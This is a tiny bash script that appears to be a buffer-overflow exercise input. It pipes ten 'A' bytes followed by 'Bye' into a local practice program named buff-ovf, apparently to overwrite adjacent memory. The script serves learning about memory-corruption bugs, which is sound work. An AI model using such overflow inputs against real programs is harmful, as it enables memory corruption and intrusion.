#!/bin/bash

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*10 + b"Bye")' | ./buff-ovf
